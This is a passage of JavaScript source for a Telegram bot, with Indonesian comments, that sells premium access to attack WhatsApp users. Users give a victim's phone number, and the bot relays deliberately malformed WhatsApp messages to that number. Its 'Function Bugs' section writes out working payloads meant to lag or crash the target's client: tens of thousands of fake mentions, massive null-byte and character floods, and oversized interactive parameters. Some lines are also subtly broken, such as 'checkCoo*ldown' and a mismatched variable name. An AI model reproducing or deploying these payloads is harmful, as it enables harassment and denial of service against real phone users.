    bot.deleteMessage(chatId, msg.message_id).catch(() => {});
    bot.sendMessage(chatId, "🚫 Pesan berisi link telah dihapus otomatis!");
  }
});

// ~ Connect
bot.onText(/\/connect (.+)/, async (msg, match) => {
const chatId = msg.chat.id;
const senderId = msg.from.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Acces Admin</blockquote>
Please Buy Acces Admin To The Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "This Is ✧ Creator", url: "https://t.me/akbarstecuu" }]
        ]
      }
    });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Missing input. Please provide the number. Example: /Connect 62xxxx.");
  }
  
  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (!botNumber || botNumber.length < 10) {
    return bot.sendMessage(chatId, "❌ Nomor yang diberikan tidak valid. Pastikan nomor yang dimasukkan benar.");
  }

  try {
    await ConnectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in Connect:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

// Acces !!
bot.onText(/^\/setcd\s*(.*)/i, (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const timeString = match[1]?.trim();

    if (!isOwner(fromId)) {
      return bot.sendMessage(chatId, "❌ You Not Owner!");
    }

    if (!timeString) {
      return bot.sendMessage(chatId, '☇ Format salah!\nEX:\n/setcd 5s\n/setcd 10m\n/setcd 1h');
    }

    const result = setCooldown(timeString);

    if (result.startsWith("Format salah")) {
      return bot.sendMessage(chatId, `☇ ${result}\nEX:\n/setcd 5s\n/setcd 10m\n/setcd 1h`);
    }

    bot.sendMessage(chatId, result);
  });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const premiumStatus = getPremiumStatus(senderId);
  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "This Is ✧ Creator", url: "https://t.me/akbarstecuu" }]
        ]
      }
    });
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem ID 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem ID 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem ID 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${senderId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${senderId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${senderId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const premiumStatus = getPremiumStatus(senderId);

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "This Is ✧ Creator", url: "https://t.me/akbarstecuu" }]
        ]
      }
    });
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "<blockquote>𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 — 𝘼𝙆𝘽𝘼𝙍 [ 🍁 ]</blockquote>\nList - Premium\n\n";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "HTML" });
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id
    const premiumStatus = getPremiumStatus(senderId);

  if (!isOwner(senderId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "This Is ✧ Creator", url: "https://t.me/akbarstecuu" }]
        ]
      }
    });
  }
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin id.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin id.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${senderId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${senderId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${senderId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const premiumStatus = getPremiumStatus(senderId);

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem id");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const premiumStatus = getPremiumStatus(senderId);

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "This Is ✧ Creator", url: "https://t.me/akbarstecuu" }]
        ]
      }
    });
  }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin id.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin id.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

// ~ Case Bugs 1
bot.onText(/\/XGostDelay (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "This Is ✧ Creator", url: "https://t.me/@akbarstecuu" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 — 𝘼𝙆𝘽𝘼𝙍 [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Delaymedium
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

<blockquote> © 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 — 𝘼𝙆𝘽𝘼𝙍 </blockquote>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 5; i++) {
    await FKumOInvis(sock, target);
    await sleep(5000);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 — 𝘼𝙆𝘽𝘼𝙍 [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Delaymedium
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

<blockquote> © 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 — 𝘼𝙆𝘽𝘼𝙍 </blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 2
bot.onText(/\/XDelay (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCoo*ldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "This Is ✧ Creator", url: "https://t.me/akbarstecuu" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「  [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Delayhard
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

<blockquote> © 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 — 𝘼𝙆𝘽𝘼𝙍</blockquote>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 2; i++) {
    await delayMemew(sock, target)
    await delayMemew(sock, target)
    await sleep(5000);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 — 𝘼𝙆𝘽𝘼𝙍 [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Delayhard
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

<blockquote> © 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 — 𝘼𝙆𝘽𝘼𝙍</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/DelayMaklo (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCoo*ldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "This Is ✧ Creator", url: "https://t.me/akbarstecuu" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 — 𝘼𝙆𝘽𝘼𝙍 [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Delay bebas spam
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

<blockquote> © 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 ~ 𝘼𝙆𝘽𝘼𝙍 </blockquote>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 2; i++) {
    await Jtwdlyinvis(target)
    await Jtwdlyinvis(target)
    await sleep(5000);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 — 𝘼𝙆𝘽𝘼𝙍[ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Delay bebas spam
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

<blockquote> © akbar - off freedom </blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Function Bugs
async function delayMemew(sock, target) {
 try {
   let Jarr77 = {
   viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };
  
  let Jarr2 = {
    extendedTextMessage: {
      text: "JARRR KILL YOU" + "\u0000".repeat(1000) + "https://wa.me/stickerpack/Jarr77",
      matchedText: "https://wa.me/stickerpack/Jarr77",
      description: "\u74A7",
      title: "ʝαяя ƒяσм ʝαωα",
      previewType: "NONE",
      jpegThumbnail: "",
      inviteLinkGroupTypeV2: "DEFAULT", 
      contextInfo: {
        externalAdReply: {
          renderLargerThumbnail: true,
          thumbnailUrl: "https://wa.me/stickerpack/Jarr77",
          sourceUrl: "https://wa.me/stickerpack/Jarr77",
          showAdAttribution: true,
          body: "Jar77",
          title: "Newbies"
        }, 
        isForwarded: true,
        forwardingScore: 999,
        forwardedNewsletterMessageInfo: {
          newsletterName: "Dementor Infinity Class",
          newsletterJid: "13135550002@newsletter",
          serverId:1
        }
      }
    }
  }
  
  const msg = generateWAMessageFromContent(target, Jarr77, {});
  const msg2 = generateWAMessageFromContent(target, Jarr2, {});
  
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: generateRandomMessageId(),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  await sock.relayMessage("status@broadcast", msg2.message, {
    messageId: generateRandomMessageId(),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
    console.log("DelayMemew Send To Target", target);

  } catch (err) {
    console.error("Error in :", err);
  }
}

async function FuncMakLuAmpas(sock, target) {
 try {
  let MakLu = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Anjay",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(90000),
              version: 3
            },
            entryPointConversionSource: "call_permission_message",
          }
        }
      }
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 999999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(18).padStart(6, "999999999"),
    });
    
    await sock.relayMessage("status@broadcast", MakLu.message, {
      messageId:Maklu.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [
            { tag: "to", attrs: { jid: target }, content: undefined }
          ]
        }]
      }]
    });

  } catch (error) {
    console.error("Error di :", error, "Fix Sendiri Lu Kan Dev🤓");
  }
};

async function FKumOInvis(sock, target) {
    try {
        const delayPayload = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "𝐕𝐈𝐍𝐀 𝐓𝐎𝐁𝐑𝐔𝐓 𓆩𓆪" + "ꦾꦽꦾꦽ".repeat(5000),
                            hasMediaAttachment: false
                        },
                        body: {
                            text: "𝐕𝐈𝐍𝐀 𝐓𝐎𝐁𝐑𝐔𝐓𓆩𓆪" + "ꦾꦾꦾ".repeat(3000) + "\u202D" + "𑇂𑇂𑇂".repeat(2000)
                        },
                        nativeFlowMessage: {
                            messageParamsJson: JSON.stringify({
                                render_delay: 9999,
                                force_processing: true
                            })
                        }
                    }
                }
            }
        };

        const locationCrash = {
            location: {
                degreesLatitude: -1,
                degreesLongitude: 1,
                name: "𝐕𝐈𝐍𝐀 𝐓𝐎𝐁𝐑𝐔𝐓𓆩𓆪",
                address: "https://" + "ꦾ".repeat(1000) + ".com" 
            }
        };

        const buttonFlood = {
            interactiveMessage: {
                body: { text: "DELAY ACTIVE" },
                nativeFlowMessage: {
                    buttons: Array.from({length: 10}, (_, i) => ({
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "⃝⃞⃟⃠".repeat(50000), // Extreme Tapi tetep Aman
                            options: Array.from({length: 50}, (_, j) => ({
                                name: "OPTION_" + "\u2063".repeat(50)
                            }))
                        })
                    }))
                }
            }
        };

        await Promise.all([
            sock.sendMessage(target, delayPayload),
            sock.sendMessage(target, locationCrash),
            sock.sendMessage(target, buttonFlood)
        ]);

        console.log("✅ Delay vina Send to " + target);

    } catch(err) {
        console.log("⚠️ Delay Error:", err.message);
    }
}

async function Jtwdlyinvis(target) {
    let permissionX = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "RAMZYNOTDEV",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let permissionY = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "RAMZYNOTDEV",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
               "#" +
               Math.floor(Math.random() * 16777215)
               .toString(16)
               .padStart(6, "99999999"),
        }
    );    

    await sock.relayMessage(
        "status@broadcast",
        permissionX.message,
        {
            messageId: permissionX.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        permissionY.message,
        {
            messageId: permissionY.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}

// ~ End Function Bugs

